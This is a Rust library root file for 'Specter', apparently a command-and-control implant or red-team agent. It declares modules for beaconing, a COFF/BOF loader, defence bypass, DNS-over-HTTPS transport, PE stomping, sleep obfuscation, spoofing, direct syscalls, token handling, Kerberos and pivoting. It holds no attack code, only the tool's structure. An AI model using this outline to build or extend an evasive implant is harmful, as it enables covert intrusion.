//! Specter library surface for tests and alternate entrypoints.

// Rust 2024: the body of `unsafe fn` is not an implicit `unsafe` block; Win32/NT
// FFI call sites are therefore dense. Nesting a redundant `unsafe { }` around
// every syscall in every `unsafe fn` would add no safety signal; allow here.
#![allow(unsafe_op_in_unsafe_fn)]

pub mod agent;
pub mod beacon_api;
pub mod bof_context;
pub mod bypass;
pub mod coffeeldr;
pub mod config;
pub mod dispatch;
pub mod doh_transport;
pub mod dotnet;
pub mod download;
pub mod ecdh;
pub mod error;
pub mod job;
pub mod kerberos;
pub mod metadata;
pub mod pe_stomp;
pub mod pivot;
pub mod platform;
pub mod protocol;
pub mod sleep_obf;
pub mod socket;
pub mod spoof;
pub mod syscall;
pub mod token;
pub mod transport;

pub use agent::SpecterAgent;
pub use config::SpecterConfig;
pub use error::SpecterError;
